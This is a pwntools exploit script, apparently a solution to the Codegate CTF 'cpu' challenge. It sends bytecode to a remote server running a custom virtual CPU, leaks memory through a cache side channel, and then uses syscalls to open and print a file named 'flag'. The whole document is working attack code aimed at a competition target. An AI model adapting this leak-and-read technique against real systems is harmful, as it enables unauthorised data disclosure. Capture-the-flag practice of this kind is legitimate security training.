#!/usr/bin/python
from pwn import *

r = remote('ch41l3ng3s.codegate.kr', 5566)
#r = process('./cpu')
#r = gdb.debug('./cpu')

def I(opc, sreg, dreg, treg, imm):
    opc &= 0xff
    sreg &= 0xf
    dreg &= 0xf
    treg &= 0xf
    imm &= 0xfff
    return (opc << 24) | (sreg << 20) | (dreg << 16) | (treg << 12) | imm

def IIMM(opc, sreg, imm):
    opc &= 0xff
    sreg &= 0xf
    imm &= 0xfffff
    return (opc << 24) | (sreg << 20) | imm

NOP              = 0
LDIMM            = 1
LD               = 2
SD               = 3
JMP              = 4
PRINTC           = 5
PRINTI           = 6
BNE              = 7
BEQ              = 8
BGT              = 9
BLT              = 10
BGE              = 11
BLE              = 12
ADD              = 13
SUB              = 14
MOV              = 15
SHL              = 16
LDR              = 17
SDR              = 18
NOP2             = 19
CSH              = 20
SYSCALL          = 21
SHR              = 22
SFH              = 23

pc = 0
code = [
    I(SFH, 2, 0, 0, 0),
    IIMM(LDIMM, 6, 0),
    IIMM(LDIMM, 7, 0),
]
for x in xrange(4):
    pc = len(code) * 4
    code += [
        # memory address to leak
        IIMM(LDIMM, 1, 0x35000 + 3 - x),
        # add to the cache
        I(CSH, 4, 1, 0, 0xF00),
        IIMM(LDIMM, 2, 0),
        IIMM(LDIMM, 4, 0x1000),

        # test if it is still in the cache
        IIMM(LDIMM, 1, 0xF00),
        I(PRINTI, 1, 0, 0, 0),
        I(LDR, 1, 3, 0, 0),
        IIMM(LDIMM, 3, 0x1),
        I(BEQ, 14, 0, 3, pc + 4 * 11),
        # test next address
        I(ADD, 1, 1, 4, 0),
        I(JMP, 0, 0, 0, pc + 4 * 5),

        # clear cache
        I(CSH, 15, 0, 0, 0),

        I(SHR, 1, 1, 0, 12),
        I(SHL, 6, 6, 0, 8),
        I(ADD, 6, 6, 1, 0),
    ]
for x in xrange(4):
    pc = len(code) * 4
    code += [
        # memory address to leak
        IIMM(LDIMM, 1, 0x35004 + 3 - x),
        # add to the cache
        I(CSH, 4, 1, 0, 0xF00),
        IIMM(LDIMM, 2, 0),
        IIMM(LDIMM, 4, 0x1000),

        # test if it is still in the cache
        IIMM(LDIMM, 1, 0xF00),
        I(PRINTI, 1, 0, 0, 0),
        I(LDR, 1, 3, 0, 0),
        IIMM(LDIMM, 3, 0x1),
        I(BEQ, 14, 0, 3, pc + 4 * 11),
        # test next address
        I(ADD, 1, 1, 4, 0),
        I(JMP, 0, 0, 0, pc + 4 * 5),

        # clear cache
        I(CSH, 15, 0, 0, 0),

        I(SHR, 1, 1, 0, 12),
        I(SHL, 7, 7, 0, 8),
        I(ADD, 7, 7, 1, 0),
    ]
code += [
    IIMM(LDIMM, 1, 0xa),
    I(PRINTC, 1, 0, 0, 0),
    I(PRINTC, 1, 0, 0, 0),
    I(PRINTC, 1, 0, 0, 0),
    I(PRINTC, 1, 0, 0, 0),
    I(PRINTI, 6, 0, 0, 0),
    I(PRINTC, 1, 0, 0, 0),
    I(PRINTI, 7, 0, 0, 0),
    I(PRINTC, 1, 0, 0, 0),
    I(PRINTC, 1, 0, 0, 0),
    I(PRINTC, 1, 0, 0, 0),
    I(PRINTC, 1, 0, 0, 0),
]


pc = len(code) * 4 + 13 * 4
code += [
    IIMM(LDIMM, 1, pc),
    IIMM(LDIMM, 0, 0x3),
    I(SYSCALL, 0, 0, 0, 0),

    I(MOV, 5, 1, 0, 0),
    IIMM(LDIMM, 0, 0x1),
    IIMM(LDIMM, 2, 0x10000),
    IIMM(LDIMM, 3, 0x100),
    I(SYSCALL, 0, 0, 0, 0),

    IIMM(LDIMM, 0, 0x2),
    IIMM(LDIMM, 1, 0x1),
    IIMM(LDIMM, 2, 0x10000),
    IIMM(LDIMM, 3, 0x100),
    I(SYSCALL, 0, 0, 0, 0),
]

data = 'flag'.ljust(0x40, '\x00')
for x in xrange(0, 0x40, 4):
    code += [u32(data[x:x+4])]


data = '\n'.join(map(str, code))

r.sendline(data)
r.sendline('0')

r.interactive()

